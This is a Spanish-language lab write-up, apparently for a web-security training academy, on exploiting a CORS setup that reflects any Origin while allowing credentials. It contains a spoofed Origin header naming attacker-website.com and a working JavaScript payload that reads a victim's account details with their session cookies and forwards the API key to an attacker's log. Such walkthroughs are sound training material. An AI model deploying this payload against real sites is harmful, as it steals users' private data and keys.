## Vulnerabilidad CORS con reflexión básica de Origin

**Objetivo**: Explotar una configuración insegura de CORS que refleja dinámicamente cualquier origen para robar información sensible (API Key) de un usuario.

### 1. Reconocimiento (Análisis de Encabezados)
Identificar que la aplicación confía ciegamente en cualquier origen mediante Burp Repeater:

**Payload (Header)**:

```HTTP
Origin: https://attacker-website.com
```

**Explicación**:

*Access-Control-Allow-Credentials*: La presencia de este encabezado en true indica que el servidor permite peticiones que incluyan cookies de sesión (imprescindible para robar datos privados).

Reflexión de Origin: Al enviar un origen arbitrario, el servidor responde con Access-Control-Allow-Origin: https://attacker-website.com. Esto confirma que cualquier sitio web malicioso puede realizar peticiones en nombre del usuario.

### 2. Explotación (Robo de API Key)

Crear un script en el servidor del atacante que fuerce al navegador de la víctima a leer sus propios datos y enviárnoslos:

**Payload (JavaScript)**:

```HTML
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true; // Envía las cookies de sesión de la víctima
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText; // Envía la respuesta a nuestro log
    };
</script>
```

**Explicación**:

*withCredentials* = true: Es la pieza clave. Indica al navegador que debe incluir la cookie de sesión de la víctima en la petición hacia el laboratorio.

*XMLHttpRequest*: Realiza la petición en segundo plano hacia /accountDetails (donde está la API Key).

*location='/log?key='*: Una vez recibida la respuesta, el script redirige o envía los datos capturados al servidor de logs del atacante para su posterior visualización.

### 📝 Resumen Técnico
¿Por qué ocurre? El servidor está configurado para leer el encabezado Origin de la petición y devolverlo en el encabezado Access-Control-Allow-Origin sin validarlo contra una lista blanca.

¿Qué permite Access-Control-Allow-Credentials? Permite que el ataque funcione incluso si la información está protegida tras un login, ya que el navegador adjunta automáticamente las cookies de la víctima.

¿Cuál es el impacto? Un atacante puede extraer cualquier información privada que se muestre en la página (tokens, datos personales, claves) simplemente logrando que la víctima visite un enlace malicioso.